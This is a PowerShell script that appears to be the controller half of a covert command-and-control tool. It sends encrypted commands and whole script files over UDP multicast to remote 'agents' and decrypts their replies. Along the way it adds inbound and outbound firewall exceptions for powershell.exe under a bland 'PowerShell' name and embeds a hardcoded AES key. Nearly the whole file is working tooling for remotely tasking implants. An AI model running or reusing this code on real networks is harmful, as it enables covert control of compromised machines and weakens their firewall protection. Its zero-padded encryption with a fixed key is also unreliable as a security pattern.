function Create-AesManagedObject($key, $IV) {
    $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
    $aesManaged.BlockSize = 128
    $aesManaged.KeySize = 256
    if ($IV) {
        if ($IV.getType().Name -eq "String") {
            $aesManaged.IV = [System.Convert]::FromBase64String($IV)
        }
        else {
            $aesManaged.IV = $IV
        }
    }
    if ($key) {
        if ($key.getType().Name -eq "String") {
            $aesManaged.Key = [System.Convert]::FromBase64String($key)
        }
        else {
            $aesManaged.Key = $key
        }
    }
    $aesManaged
}

function Create-AesKey() {
    $aesManaged = Create-AesManagedObject
    $aesManaged.GenerateKey()
    [System.Convert]::ToBase64String($aesManaged.Key)
}

function Encrypt-String($key, $unencryptedString) {
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString)
    $aesManaged = Create-AesManagedObject $key
    $encryptor = $aesManaged.CreateEncryptor()
    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
    [byte[]] $fullData = $aesManaged.IV + $encryptedData
    $aesManaged.Dispose()
    [System.Convert]::ToBase64String($fullData)
}

function Decrypt-String($key, $encryptedStringWithIV) {
    $bytes = [System.Convert]::FromBase64String($encryptedStringWithIV)
    $IV = $bytes[0..15]
    $aesManaged = Create-AesManagedObject $key $IV
    $decryptor = $aesManaged.CreateDecryptor();
    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);
    $aesManaged.Dispose()
    [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
}

function Send-CommandToAgent {

    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $false)]
        [IPAddress]
        $MultiCastGroup = "224.1.1.1",

        [Parameter(Mandatory = $false)]
        [Int]
        $MultiCastPort = 51111,

        [Parameter(Mandatory = $false)]
        [Int]
        $BindPort = 51112,

        [Parameter(Mandatory = $false)]
        [String]
        $AgentID,
        
        [Parameter(Mandatory = $false)]
        [String]
        $Command,

        [Parameter(Mandatory = $False)]
        [String]
        $AESKey ="MXDLZ3Og/O3MhybYvS/T6yI9nLyrLajbm7IAfRDmiKM=",

        [Parameter(Mandatory = $False)]
        [String]
        $Script = $null
    )

    New-NetFirewallRule -Program "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe" -Action Allow -Profile Domain, Private -DisplayName "PowerShell" -Description "PowerShell" -Direction Inbound
    New-NetFirewallRule -Program "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe" -Action Allow -Profile Domain, Private -DisplayName "PowerShell" -Description "PowerShell" -Direction Outbound
    #netsh advfirewall firewall add rule name="PowerShell" dir=in action=allow program="c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe" enable=yes
    #netsh advfirewall firewall add rule name="PowerShell" dir=out action=allow program="c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe" enable=yes
        
    #Send Agent ID and Command 
    $udp_client = new-Object System.Net.Sockets.UdpClient $BindPort
    $udp_client.client.SendBufferSize = 64000
    #$udp_client.AllowNatTraversal($True)
    $multicast_group = [IPAddress]$MultiCastGroup
    $udp_client.JoinMulticastGroup($multicast_group)
    $enc = [system.Text.Encoding]::ASCII
    if ($script) {
        $ScriptContent = Get-Content -Path $script -Delimiter "KSOA"      
    }
    $data = "$AgentID`;$Command`;$ScriptContent"
    $encrypted_data = Encrypt-String $AESKey $data
    $encrypted_packet = $enc.GetBytes($encrypted_data)
    $endpoint = New-Object Net.IPEndpoint([IPAddress]::Parse($MultiCastGroup),$MultiCastPort)
    $udp_client.Connect($endpoint)
    $udp_client.ttl = 255
    $udp_client.Send($encrypted_packet,$encrypted_packet.Length) |Out-Null  
    $udp_client.Close()
    $udp_client.dispose()
    if ($Command -eq "ExitAgent") {
        break
    }    
    $udp_client = New-Object System.Net.Sockets.UdpClient
    $udp_client.ExclusiveAddressUse = $False
    $LocalEndPoint = New-Object System.Net.IPEndPoint([ipaddress]::Any,$MultiCastPort)
    $udp_client.Client.SetSocketOption([System.Net.Sockets.SocketOptionLevel]::Socket, [System.Net.Sockets.SocketOptionName]::ReuseAddress,$true)
    $udp_client.ExclusiveAddressUse = $False
    $udp_client.Client.Bind($LocalEndPoint)
    $multicast_group = [IPAddress]::Parse($MultiCastGroup)
    $udp_client.JoinMulticastGroup($multicast_group)
    $receivebytes = $udp_client.Receive([ref]$endpoint)
    $receive_data = ([text.encoding]::ASCII).GetString($receivebytes)
    # Decrypt packet
    $decrypted_data = Decrypt-String $AESKey $receive_data
    $decrypted_data    
    $udp_client.Close()|Out-Null
    $udp_client.dispose()             
}
